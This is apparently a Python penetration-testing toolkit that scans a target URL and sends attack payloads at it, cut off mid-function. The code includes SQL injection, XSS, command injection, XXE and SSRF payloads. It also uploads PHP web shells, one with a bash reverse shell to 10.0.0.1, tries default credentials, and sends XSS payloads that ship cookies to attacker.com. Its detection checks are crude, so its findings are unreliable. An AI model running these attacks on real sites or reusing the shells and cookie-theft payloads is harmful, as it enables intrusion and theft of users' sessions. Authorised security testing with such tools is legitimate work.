#!/usr/bin/env python3
"""
Penetration Testing Toolkit - Main Application
For educational and authorised testing purposes only.
"""

import os
import json
import socket
import logging
import requests
import threading
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt
from jinja2 import Environment, FileSystemLoader
from dotenv import load_dotenv
from urllib.parse import urlparse
from urllib.parse import urljoin
import time
import argparse
import sys

# Import models
from models import (
    Session,
    InformationGathering,
    VulnerabilityScan,
    ManualTesting,
    Exploitation,
    PostExploitation,
    Report
)

# Import utilities
from utils import (
    validate_input,
    rate_limiter,
    get_demo_target,
    list_demo_targets,
    get_safe_paths,
    DEMO_TARGETS
)

# Project structure
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ARTIFACTS_DIR = os.path.join(PROJECT_ROOT, 'artifacts')
LOGS_DIR = os.path.join(ARTIFACTS_DIR, 'logs')
DB_DIR = os.path.join(ARTIFACTS_DIR, 'db')
REPORTS_DIR = os.path.join(ARTIFACTS_DIR, 'reports')
TEMPLATES_DIR = os.path.join(PROJECT_ROOT, 'src', 'templates')
PAYLOADS_DIR = os.path.join(PROJECT_ROOT, 'src', 'payloads')

# Create necessary directories
for directory in [ARTIFACTS_DIR, LOGS_DIR, DB_DIR, REPORTS_DIR]:
    os.makedirs(directory, exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s %(levelname)-8s %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, 'pentest.log')),
        logging.StreamHandler()
    ]
)

# Load environment variables
load_dotenv()

# Load database engine from models
from models import engine, Session

# Create declarative base
from models import Base

# Create tables
# Removed redundant table creation since it's already handled in models/__init__.py

def print_section(title, content=None):
    """Helper function to print formatted sections."""
    width = 80
    print("\n" + "=" * width)
    print(f" {title} ".center(width, "="))
    print("=" * width)
    if content:
        print(content)

def information_gathering(target):
    """
    Perform comprehensive information gathering on the target.
    This includes port scanning, directory enumeration, technology detection,
    and searching for sensitive information.
    """
    validate_input(target)
    print_section("Starting Information Gathering")
    print(f"Target: {target}")
    logging.info("[INFO] Starting Information Gathering...")
    
    findings = {
        "Basic Information": [],
        "HTTP Headers": [],
        "Technologies": [],
        "Discovered Paths": []
    }
    
    try:
        parsed_url = urlparse(target)
        domain = parsed_url.netloc
        
        # 1. Basic Information
        try:
            ip = socket.gethostbyname(domain)
            findings["Basic Information"].append(f"IP Address: {ip}")
            logging.info(f"[INFO] Target IP: {ip}")
            
            # Get DNS information
            try:
                dns_info = socket.gethostbyaddr(ip)
                findings["Basic Information"].append(f"Hostname: {dns_info[0]}")
                if len(dns_info[1]) > 0:
                    findings["Basic Information"].append(f"Aliases: {', '.join(dns_info[1])}")
                logging.info(f"[INFO] Hostname: {dns_info[0]}")
            except socket.herror:
                logging.warning("[WARNING] Could not retrieve DNS information")
        except socket.gaierror:
            logging.error("[ERROR] Could not resolve domain")
            return
        
        # 2. HTTP Headers Analysis
        try:
            headers = requests.head(target, allow_redirects=True).headers
            interesting_headers = [
                'Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Runtime',
                'X-Frame-Options', 'X-XSS-Protection', 'Content-Security-Policy',
                'Strict-Transport-Security', 'X-Content-Type-Options',
                'Access-Control-Allow-Origin', 'X-Generator', 'X-Backend-Server'
            ]
            for header in interesting_headers:
                if header in headers:
                    findings["HTTP Headers"].append(f"{header}: {headers[header]}")
                    logging.info(f"[INFO] {header}: {headers[header]}")
        except requests.RequestException:
            logging.error("[ERROR] Failed to retrieve HTTP headers")
        
        # 3. Technology Detection
        try:
            response = requests.get(target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Meta tags analysis
            meta_tags = soup.find_all('meta')
            for tag in meta_tags:
                if tag.get('name') in ['generator', 'application-name', 'framework']:
                    findings["Technologies"].append(f"Meta {tag.get('name')}: {tag.get('content')}")
            
            # JavaScript libraries
            scripts = soup.find_all('script', src=True)
            js_libs = []
            for script in scripts:
                src = script['src']
                if any(lib in src.lower() for lib in ['jquery', 'angular', 'react', 'vue', 'bootstrap']):
                    js_libs.append(src)
            if js_libs:
                findings["Technologies"].append(f"JavaScript Libraries: {', '.join(js_libs)}")
            
            # Common CMS detection
            cms_indicators = {
                'wordpress': ['/wp-content', '/wp-includes', 'wp-json'],
                'drupal': ['/sites/default', '/core/misc', 'drupal.js'],
                'joomla': ['/administrator', 'joomla.javascript'],
                'magento': ['/skin/frontend', '/mage/'],
                'django': ['csrfmiddlewaretoken', '__admin__'],
                'laravel': ['/vendor/laravel', '_token']
            }
            
            for cms, indicators in cms_indicators.items():
                if any(indicator in response.text for indicator in indicators):
                    findings["Technologies"].append(f"CMS Detected: {cms.title()}")
        except requests.RequestException:
            logging.error("[ERROR] Failed to analyze website technologies")
        
        # 4. Directory and File Enumeration
        common_paths = [
            # Admin panels
            '/admin', '/administrator', '/admincp', '/adminer',
            '/phpmyadmin', '/wp-admin', '/cpanel', '/webmaster',
            
            # Common directories
            '/backup', '/backups', '/bak', '/old', '/temp', '/tmp',
            '/logs', '/log', '/debug', '/test', '/testing',
            '/dev', '/development', '/stage', '/staging',
            
            # Configuration files
            '/.env', '/config.php', '/configuration.php',
            '/wp-config.php', '/config.yml', '/settings.php',
            '/.git/config', '/.gitignore', '/composer.json',
            '/package.json', '/Gemfile', '/requirements.txt',
            
            # Information files
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/server-status',
            '/status', '/health', '/metrics',
            
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/swagger', '/docs', '/redoc', '/api-docs',
            
            # Common web frameworks
            '/wp-includes', '/wp-content', '/sites/default',
            '/core', '/vendor', '/node_modules',
            
            # Potentially sensitive
            '/.svn', '/.git', '/.hg', '/.bzr', '/.env.local',
            '/.env.dev', '/.env.development', '/.env.prod',
            '/id_rsa', '/id_dsa', '/.ssh', '/.bash_history'
        ]
        
        print_section("Directory Enumeration In Progress")
        print("Scanning for common paths and sensitive files...")
        
        for path in common_paths:
            try:
                url = urljoin(target, path)
                response = requests.head(url, allow_redirects=True)
                if response.status_code in [200, 301, 302, 403]:
                    finding = f"{url} (Status: {response.status_code})"
                    findings["Discovered Paths"].append(finding)
                    print(f"[+] Found: {finding}")
                time.sleep(0.5)  # Delay to avoid overwhelming the server
            except requests.RequestException:
                continue
        
        # 5. Store results in database
        session = Session()
        try:
            info = InformationGathering(
                target=target,
                target_ip=ip,
                http_header=json.dumps(dict(headers))
            )
            session.add(info)
            session.commit()
            logging.info("[INFO] Information gathering results stored in database")
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Database error: {str(db_error)}")
        finally:
            session.close()
        
        # Print Final Results
        print_section("Information Gathering Results")
        
        for section, items in findings.items():
            if items:
                print_section(section)
                for item in items:
                    print(f"[+] {item}")
            
    except Exception as e:
        logging.error(f"[ERROR] Information gathering failed: {str(e)}")
        raise

# Vulnerability Scanning
def vuln_scan(target):
    """Perform comprehensive vulnerability scanning on the target."""
    validate_input(target)
    logging.info("[INFO] Starting Vulnerability Scanning...")
    
    findings = {
        "SQL Injection": False,
        "XSS": False,
        "CSRF": False,
        "Path Traversal": False,
        "Command Injection": False,
        "Authentication Bypass": False,
        "XXE": False,
        "SSRF": False
    }
    
    try:
        # SQL Injection Test
        try:
            sql_payloads = [
                "'", "1' OR '1'='1", "1; DROP TABLE users",
                "' UNION SELECT NULL--", "' WAITFOR DELAY '0:0:10'--",
                "admin' --", "admin' #", "' OR 'x'='x",
                "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' ORDER BY 10--", "1' GROUP BY 1,2,3--"
            ]
            for payload in sql_payloads:
                test_paths = [
                    f"{target}/search?q={urllib.parse.quote(payload)}",
                    f"{target}/product?id={urllib.parse.quote(payload)}",
                    f"{target}/user?id={urllib.parse.quote(payload)}",
                    f"{target}/article?id={urllib.parse.quote(payload)}"
                ]
                for test_url in test_paths:
                    try:
                        response = requests.get(test_url, timeout=10)
                        if any(indicator in response.text.lower() for indicator in [
                            "sql", "mysql", "sqlite", "database error", "syntax error",
                            "microsoft ole db provider", "odbc drivers error",
                            "microsoft sql native client error", "postgresql error",
                            "ora-", "plsql", "mysql_fetch", "fetch_array", "sybase"
                        ]):
                            findings["SQL Injection"] = True
                            print_section("SQL Injection Test Results")
                            print(f"[+] SQL Injection vulnerability found: {test_url}")
                            logging.warning("[VULNERABLE] SQL Injection Found")
                            break
                    except requests.Timeout:
                        # Timeout could indicate successful time-based SQL injection
                        findings["SQL Injection"] = True
                        print_section("SQL Injection Test Results")
                        print(f"[+] Potential time-based SQL Injection found: {test_url}")
                        logging.warning("[VULNERABLE] Time-based SQL Injection Found")
                        break
                if findings["SQL Injection"]:
                    break
            if not findings["SQL Injection"]:
                print_section("SQL Injection Test Results")
                print("[-] SQL Injection vulnerability not found")
                logging.info("[NOT VULNERABLE] SQL Injection Not Found")
        except requests.RequestException:
            logging.error("[ERROR] SQL Injection Test Failed")

        # XSS Test
        try:
            xss_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "\"><script>alert(1)</script>",
                "';alert(1);//",
                "<img src=\"x\" onerror=\"alert(1)\">",
                "<body onload=alert(1)>",
                "<object data=\"javascript:alert(1)\">",
                "<iframe src=\"javascript:alert(1)\">",
                "'-alert(1)-'",
                "\";alert(1);//"
            ]
            for payload in xss_payloads:
                test_paths = [
                    f"{target}/search?q={urllib.parse.quote(payload)}",
                    f"{target}/comment?text={urllib.parse.quote(payload)}",
                    f"{target}/profile?name={urllib.parse.quote(payload)}",
                    f"{target}/message?content={urllib.parse.quote(payload)}"
                ]
                for test_url in test_paths:
                    response = requests.get(test_url)
                    if payload in response.text:
                        findings["XSS"] = True
                        print_section("XSS Test Results")
                        print(f"[+] XSS vulnerability found: {test_url}")
                        logging.warning("[VULNERABLE] Cross-Site Scripting (XSS) Found")
                        break
                if findings["XSS"]:
                    break
            if not findings["XSS"]:
                print_section("XSS Test Results")
                print("[-] XSS vulnerability not found")
                logging.info("[NOT VULNERABLE] Cross-Site Scripting (XSS) Not Found")
        except requests.RequestException:
            logging.error("[ERROR] XSS Test Failed")

        # CSRF Test
        try:
            response = requests.get(target)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_tokens = soup.find_all(attrs={"name": [
                "csrf", "csrf_token", "_token", "authenticity_token",
                "xsrf", "xsrf_token", "_csrf", "csrf-token"
            ]})
            if not csrf_tokens:
                findings["CSRF"] = True
                print_section("CSRF Test Results")
                print(f"[+] CSRF vulnerability found: {target}")
                logging.warning("[VULNERABLE] Cross-Site Request Forgery (CSRF) Found")
            else:
                print_section("CSRF Test Results")
                print("[-] CSRF vulnerability not found")
                logging.info("[NOT VULNERABLE] Cross-Site Request Forgery (CSRF) Not Found")
        except requests.RequestException:
            logging.error("[ERROR] CSRF Test Failed")

        # Path Traversal Test
        try:
            traversal_payloads = [
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\win.ini",
                "..%5c..%5c..%5cwindows%5cwin.ini"
            ]
            for payload in traversal_payloads:
                test_paths = [
                    f"{target}/download?file={urllib.parse.quote(payload)}",
                    f"{target}/image?path={urllib.parse.quote(payload)}",
                    f"{target}/include?page={urllib.parse.quote(payload)}",
                    f"{target}/load?template={urllib.parse.quote(payload)}"
                ]
                for test_url in test_paths:
                    response = requests.get(test_url)
                    if any(indicator in response.text.lower() for indicator in [
                        "root:x:", "[extensions]", "[fonts]", "[mci extensions]"
                    ]):
                        findings["Path Traversal"] = True
                        print_section("Path Traversal Test Results")
                        print(f"[+] Path Traversal vulnerability found: {test_url}")
                        logging.warning("[VULNERABLE] Path Traversal Found")
                        break
                if findings["Path Traversal"]:
                    break
            if not findings["Path Traversal"]:
                print_section("Path Traversal Test Results")
                print("[-] Path Traversal vulnerability not found")
                logging.info("[NOT VULNERABLE] Path Traversal Not Found")
        except requests.RequestException:
            logging.error("[ERROR] Path Traversal Test Failed")

        # Command Injection Test
        try:
            cmd_payloads = [
                "; sleep 5", "& ping -c 5 127.0.0.1", "| sleep 5",
                "` sleep 5 `", "$( sleep 5 )", "; ping -n 5 127.0.0.1",
                "& timeout 5", "| timeout 5", "` timeout 5 `",
                "; waitfor /t 5", "|| sleep 5", "& sleep 5 &"
            ]
            for payload in cmd_payloads:
                test_paths = [
                    f"{target}/ping?host={urllib.parse.quote(payload)}",
                    f"{target}/exec?cmd={urllib.parse.quote(payload)}",
                    f"{target}/run?command={urllib.parse.quote(payload)}",
                    f"{target}/system?action={urllib.parse.quote(payload)}"
                ]
                for test_url in test_paths:
                    try:
                        start_time = time.time()
                        response = requests.get(test_url, timeout=6)
                        elapsed_time = time.time() - start_time
                        if elapsed_time > 4.5:  # Command likely executed
                            findings["Command Injection"] = True
                            print_section("Command Injection Test Results")
                            print(f"[+] Command Injection vulnerability found: {test_url}")
                            logging.warning("[VULNERABLE] Command Injection Found")
                            break
                    except requests.Timeout:
                        findings["Command Injection"] = True
                        print_section("Command Injection Test Results")
                        print(f"[+] Potential Command Injection found: {test_url}")
                        logging.warning("[VULNERABLE] Command Injection Found")
                        break
                if findings["Command Injection"]:
                    break
            if not findings["Command Injection"]:
                print_section("Command Injection Test Results")
                print("[-] Command Injection vulnerability not found")
                logging.info("[NOT VULNERABLE] Command Injection Not Found")
        except requests.RequestException:
            logging.error("[ERROR] Command Injection Test Failed")

        # Authentication Bypass Test
        try:
            auth_payloads = [
                "admin' --", "admin' #", "' OR '1'='1",
                "' OR '1'='1' --", "' OR '1'='1' #",
                "admin' OR '1'='1", "admin' OR '1'='1' --",
                "' OR ''='", "' OR 1=1--", "' OR 'x'='x"
            ]
            for payload in auth_payloads:
                data = {
                    "username": payload,
                    "password": payload
                }
                try:
                    response = requests.post(f"{target}/login", data=data)
                    if any(indicator in response.text.lower() for indicator in [
                        "welcome", "dashboard", "profile", "admin", "logout",
                        "successfully", "authenticated"
                    ]):
                        findings["Authentication Bypass"] = True
                        print_section("Authentication Bypass Test Results")
                        print(f"[+] Authentication Bypass vulnerability found with payload: {payload}")
                        logging.warning("[VULNERABLE] Authentication Bypass Found")
                        break
                except requests.RequestException:
                    continue
            if not findings["Authentication Bypass"]:
                print_section("Authentication Bypass Test Results")
                print("[-] Authentication Bypass vulnerability not found")
                logging.info("[NOT VULNERABLE] Authentication Bypass Not Found")
        except requests.RequestException:
            logging.error("[ERROR] Authentication Bypass Test Failed")

        # XXE Injection Test
        try:
            xxe_payloads = [
                """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
                """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>""",
                """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><data>&xxe;</data>"""
            ]
            headers = {'Content-Type': 'application/xml'}
            for payload in xxe_payloads:
                test_paths = [f"{target}/upload", f"{target}/import", f"{target}/process"]
                for test_url in test_paths:
                    response = requests.post(test_url, data=payload, headers=headers)
                    if any(indicator in response.text.lower() for indicator in [
                        "root:x:", "[extensions]", "error parsing entity",
                        "xml parsing error", "invalid xml"
                    ]):
                        findings["XXE"] = True
                        print_section("XXE Test Results")
                        print(f"[+] XXE vulnerability found: {test_url}")
                        logging.warning("[VULNERABLE] XXE Injection Found")
                        break
                if findings["XXE"]:
                    break
            if not findings["XXE"]:
                print_section("XXE Test Results")
                print("[-] XXE vulnerability not found")
                logging.info("[NOT VULNERABLE] XXE Injection Not Found")
        except requests.RequestException:
            logging.error("[ERROR] XXE Test Failed")

        # SSRF Test
        try:
            ssrf_payloads = [
                "http://127.0.0.1:22",
                "http://localhost:22",
                "http://[::]:22",
                "http://127.127.127.127",
                "http://127.0.1.3:80",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:5432",
                "http://127.0.0.1:6379",
                "http://169.254.169.254/latest/meta-data/"  # AWS metadata
            ]
            for payload in ssrf_payloads:
                test_paths = [
                    f"{target}/fetch?url={urllib.parse.quote(payload)}",
                    f"{target}/proxy?url={urllib.parse.quote(payload)}",
                    f"{target}/load?url={urllib.parse.quote(payload)}",
                    f"{target}/redirect?url={urllib.parse.quote(payload)}"
                ]
                for test_url in test_paths:
                    try:
                        response = requests.get(test_url, timeout=3)
                        if response.elapsed.total_seconds() > 2 or any(indicator in response.text.lower() for indicator in [
                            "ssh", "mysql", "postgresql", "redis",
                            "internal", "amazon", "aws", "ec2"
                        ]):
                            findings["SSRF"] = True
                            print_section("SSRF Test Results")
                            print(f"[+] SSRF vulnerability found: {test_url}")
                            logging.warning("[VULNERABLE] SSRF Found")
                            break
                    except requests.Timeout:
                        findings["SSRF"] = True
                        print_section("SSRF Test Results")
                        print(f"[+] Potential SSRF found (timeout): {test_url}")
                        logging.warning("[VULNERABLE] SSRF Found (timeout)")
                        break
                if findings["SSRF"]:
                    break
            if not findings["SSRF"]:
                print_section("SSRF Test Results")
                print("[-] SSRF vulnerability not found")
                logging.info("[NOT VULNERABLE] SSRF Not Found")
        except requests.RequestException:
            logging.error("[ERROR] SSRF Test Failed")

        # Store results in database
        session = Session()
        try:
            for vuln_type, is_vulnerable in findings.items():
                scan = VulnerabilityScan(
                    target=target,
                    vulnerability=vuln_type,
                    result="Vulnerable" if is_vulnerable else "Not Vulnerable"
                )
                session.add(scan)
            
            session.commit()
            logging.info("[INFO] Vulnerability scan results stored in database")
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Database error: {str(db_error)}")
        finally:
            session.close()

        # Print Vulnerability Scan Summary
        print_section("Vulnerability Scan Summary")
        total_vulnerabilities = sum(1 for v in findings.values() if v)
        print(f"\nTotal Vulnerabilities Found: {total_vulnerabilities}")
        print("\nDetailed Results:")
        for vuln_type, is_vulnerable in findings.items():
            status = "Vulnerable" if is_vulnerable else "Not Vulnerable"
            print(f"{vuln_type}: {status}")
            
    except Exception as e:
        logging.error(f"[ERROR] Vulnerability scanning failed: {str(e)}")
        raise

    return findings

# Manual Testing
def manual_test(target):
    """
    Perform comprehensive manual testing on the target.
    Tests include directory traversal, file upload, access control,
    input validation, configuration, authentication, and session management.
    """
    validate_input(target)
    logging.info("[INFO] Starting Manual Testing...")
    print_section("Manual Testing")
    
    findings = {
        "Directory Traversal": [],
        "File Upload": [],
        "Access Control": [],
        "Input Validation": [],
        "Configuration": [],
        "Authentication": [],
        "Session Management": []
    }
    
    try:
        # 1. Advanced Directory Traversal Testing
        traversal_paths = [
            "/admin", "/backup", "/config", "/dev", "/includes",
            "/logs", "/temp", "/test", "/upload", "/images",
            "/.git", "/.svn", "/.env", "/.htaccess", "/web.config",
            "/wp-config.php", "/config.php", "/database.yml",
            "/sites/default/settings.php", "/app/etc/local.xml"
        ]
        
        print_section("Directory Traversal Testing")
        print("Testing for accessible sensitive directories...")
        
        for path in traversal_paths:
            try:
                full_url = urljoin(target, path)
                response = requests.get(full_url, allow_redirects=True, timeout=5)
                if response.status_code in [200, 403]:
                    findings["Directory Traversal"].append(f"Found accessible path: {full_url} (Status: {response.status_code})")
                    print(f"[+] {full_url} - Status: {response.status_code}")
                    logging.warning(f"[FOUND] Accessible path: {full_url}")
            except requests.RequestException:
                continue

        # 2. Advanced File Upload Testing
        print_section("File Upload Testing")
        print("Testing file upload endpoints...")
        
        upload_paths = ["/upload", "/upload.php", "/upload.asp", "/fileupload", "/assets/upload"]
        test_files = {
            "test.php": "<?php echo 'test'; ?>",
            "test.html": "<script>alert(1)</script>",
            "test.jpg.php": "<?php system($_GET['cmd']); ?>",
            "test.php.jpg": "<?php exec('/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'); ?>",
            ".htaccess": "AddType application/x-httpd-php .jpg"
        }
        
        for path in upload_paths:
            for filename, content in test_files.items():
                try:
                    files = {'file': (filename, content, 'application/octet-stream')}
                    full_url = urljoin(target, path)
                    response = requests.post(full_url, files=files, timeout=5)
                    if response.status_code in [200, 201]:
                        findings["File Upload"].append(f"Potential file upload vulnerability: {full_url} with {filename}")
                        print(f"[+] Possible file upload vulnerability: {full_url} with {filename}")
                        logging.warning(f"[VULNERABLE] File upload at {full_url}")
                except requests.RequestException:
                    continue

        # 3. Advanced Access Control Testing
        print_section("Access Control Testing")
        print("Testing for access control vulnerabilities...")
        
        sensitive_endpoints = [
            "/admin", "/administrator", "/admincp", "/manage",
            "/user/1", "/api/users", "/api/admin", "/dashboard",
            "/settings", "/configuration", "/phpinfo.php",
            "/api/v1/users", "/api/v1/admin", "/console"
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                full_url = urljoin(target, endpoint)
                response = requests.get(full_url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    findings["Access Control"].append(f"Found sensitive endpoint: {full_url} (Status: {response.status_code})")
                    print(f"[+] Found sensitive endpoint: {full_url}")
                    logging.warning(f"[FOUND] Sensitive endpoint: {full_url}")
            except requests.RequestException:
                continue

        # 4. Advanced Input Validation Testing
        print_section("Input Validation Testing")
        print("Testing for input validation vulnerabilities...")
        
        test_inputs = {
            "sql": ["' OR '1'='1", "admin' --", "1; DROP TABLE users"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "command": ["; ls -la", "& whoami", "| cat /etc/passwd"],
            "path": ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
            "nosql": ['{"$gt":""}', '{"$ne": null}', '{"$where": "sleep(1000)"}']
        }
        
        test_params = ["id", "user", "search", "query", "page", "file", "path", "url"]
        
        for param in test_params:
            for category, payloads in test_inputs.items():
                for payload in payloads:
                    try:
                        params = {param: payload}
                        response = requests.get(target, params=params, timeout=5)
                        if any(indicator in response.text.lower() for indicator in [
                            "error", "exception", "warning", "syntax", "stack trace",
                            "undefined", "null", "NaN", "cannot", "invalid", "failed"
                        ]):
                            findings["Input Validation"].append(
                                f"Potential {category} vulnerability with parameter {param}: {payload}"
                            )
                            print(f"[+] Potential {category} vulnerability found with parameter: {param}")
                            logging.warning(f"[VULNERABLE] {category} with parameter {param}")
                    except requests.RequestException:
                        continue

        # 5. Advanced Configuration Testing
        print_section("Configuration Testing")
        print("Testing for configuration vulnerabilities...")
        
        config_files = [
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            ".well-known/security.txt", "package.json", "composer.json",
            "Dockerfile", "docker-compose.yml", ".gitlab-ci.yml",
            ".travis.yml", "Jenkinsfile", ".env.example"
        ]
        
        for file in config_files:
            try:
                full_url = urljoin(target, file)
                response = requests.get(full_url, timeout=5)
                if response.status_code == 200:
                    findings["Configuration"].append(f"Found configuration file: {full_url}")
                    print(f"[+] Found configuration file: {full_url}")
                    logging.warning(f"[FOUND] Configuration file: {full_url}")
            except requests.RequestException:
                continue

        # 6. Advanced Authentication Testing
        print_section("Authentication Testing")
        print("Testing for authentication vulnerabilities...")
        
        auth_endpoints = ["/login", "/signin", "/auth", "/oauth/token"]
        common_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"}
        ]
        
        for endpoint in auth_endpoints:
            for creds in common_credentials:
                try:
                    full_url = urljoin(target, endpoint)
                    response = requests.post(full_url, json=creds, timeout=5)
                    if response.status_code in [200, 302]:
                        findings["Authentication"].append(
                            f"Potential weak credentials at {full_url}: {creds['username']}:{creds['password']}"
                        )
                        print(f"[+] Potential weak credentials found at {full_url}")
                        logging.warning(f"[VULNERABLE] Weak credentials at {full_url}")
                except requests.RequestException:
                    continue

        # 7. Advanced Session Management Testing
        print_section("Session Management Testing")
        print("Testing for session management vulnerabilities...")
        
        session = requests.Session()
        try:
            # Test session fixation
            initial_response = session.get(target)
            initial_cookies = initial_response.cookies
            
            if initial_cookies:
                # Try to use the same session ID after login
                auth_response = session.post(urljoin(target, "/login"), json={"username": "test", "password": "test"})
                post_auth_cookies = auth_response.cookies
                
                if initial_cookies.get('session') == post_auth_cookies.get('session'):
                    findings["Session Management"].append("Potential session fixation vulnerability")
                    print("[+] Potential session fixation vulnerability detected")
                    logging.warning("[VULNERABLE] Session fixation detected")
                
                # Test for secure and httpOnly flags
                for cookie in post_auth_cookies:
                    if not cookie.secure:
                        findings["Session Management"].append(f"Cookie {cookie.name} missing secure flag")
                        print(f"[+] Cookie {cookie.name} missing secure flag")
                    if not cookie.has_nonstandard_attr('httpOnly'):
                        findings["Session Management"].append(f"Cookie {cookie.name} missing httpOnly flag")
                        print(f"[+] Cookie {cookie.name} missing httpOnly flag")
        except requests.RequestException:
            logging.error("[ERROR] Session management test failed")

        # Store results in database
        session = Session()
        try:
            for category, results in findings.items():
                if results:
                    for result in results:
                        manual = ManualTesting(
                            target=target,
                            test_name=category,
                            result=result
                        )
                        session.add(manual)
            session.commit()
            logging.info("[INFO] Manual Testing results stored in database")
        except Exception as db_error:
            session.rollback()
            logging.error(f"[ERROR] Database error: {str(db_error)}")
        finally:
            session.close()

    except Exception as e:
        logging.error(f"[ERROR] Manual testing failed: {str(e)}")
        raise

    print_section("Manual Testing Summary")
    for category, results in findings.items():
        if results:
            print(f"\n{category} Findings:")
            for result in results:
                print(f"- {result}")

# Exploitation
def exploit(target):
    """
    Perform comprehensive exploitation on the target.
    Tests include SQL injection, XSS, CSRF, command injection, file inclusion,
    XXE, SSRF, authentication bypass, and deserialization attacks.
    """
    validate_input(target)   
    logging.info("[INFO] Starting Exploitation...")
    print_section("Exploitation")
    
    findings = {
        "SQL Injection": [],
        "XSS": [],
        "CSRF": [],
        "Command Injection": [],
        "File Inclusion": [],
        "XXE": [],
        "SSRF": [],
        "Authentication Bypass": [],
        "Deserialization": []
    }
    
    try:
        # 1. Advanced SQL Injection Exploitation
        print_section("SQL Injection Exploitation")
        print("Testing SQL injection attack vectors...")
        
        sql_payloads = {
            "Union Based": [
                "1' UNION SELECT table_name,2,3 FROM information_schema.tables--",
                "1' UNION SELECT column_name,2,3 FROM information_schema.columns--",
                "1' UNION SELECT username,password,3 FROM users--",
                "1' UNION SELECT @@version,2,3--",
                "1' UNION SELECT super_priv,2,3 FROM mysql.user--"
            ],
            "Time Based": [
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1') AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            "Error Based": [
                "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                "1' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
                "1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e))s), 8446744073709551610, 8446744073709551610)))--"
            ]
        }
        
        for attack_type, payloads in sql_payloads.items():
            for payload in payloads:
                try:
                    test_paths = [
                        f"{target}/product?id={urllib.parse.quote(payload)}",
                        f"{target}/article?id={urllib.parse.quote(payload)}",
                        f"{target}/user?id={urllib.parse.quote(payload)}",
                        f"{target}/search?q={urllib.parse.quote(payload)}"
                    ]
                    for test_url in test_paths:
                        response = requests.get(test_url, timeout=10)
                        if any(indicator in response.text.lower() for indicator in [
                            "mysql", "sql", "oracle", "sqlite", "postgresql",
                            "microsoft sql server", "odbc", "jdbc", "ole db",
                            "table", "column", "database", "syntax"
                        ]):
                            findings["SQL Injection"].append(f"Successful {attack_type} injection at: {test_url}")
                            print(f"[+] Successful {attack_type} SQL injection at: {test_url}")
                            logging.warning(f"[EXPLOITED] {attack_type} SQL injection at {test_url}")
                except requests.RequestException:
                    continue

        # 2. Advanced XSS Exploitation
        print_section("XSS Exploitation")
        print("Testing cross-site scripting attack vectors...")
        
        xss_payloads = {
            "Basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"
            ],
            "Advanced": [
                "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                "<script>new Image().src='http://attacker.com/steal?'+document.cookie;</script>",
                "<svg><script>alert&#40;1)</script>",
                "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://attacker.com/xss.js\\';document.body.appendChild(a)')"
            ],
            "DOM Based": [
                "';alert(document.domain)//",
                "\"><img src=x onerror=alert(document.cookie)>",
                "javascript:alert(document.domain)"
            ],
            "Filter Bypass": [
                "<scr<script>ipt>alert(1)</script>",
                "<img src=\"x\" onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                "'+alert(1)+'",
                "\";alert(1);//"
            ]
        }
        
        for attack_type, payloads in xss_payloads.items():
            for payload in payloads:
                try:
                    test_paths = [
                        f"{target}/search?q={urllib.parse.quote(payload)}",
                        f"{target}/comment?text={urllib.parse.quote(payload)}",
                        f"{target}/profile?name={urllib.parse.quote(payload)}",
                        f"{target}/feedback?message={urllib.parse.quote(payload)}"
                    ]
                    for test_url in test_paths:
                        response = requests.get(test_url, timeout=5)
                        if payload.lower() in response.text.lower():
                            findings["XSS"].append(f"Successful {attack_type} XSS at: {test_url}")
                            print(f"[+] Successful {attack_type} XSS at: {test_url}")
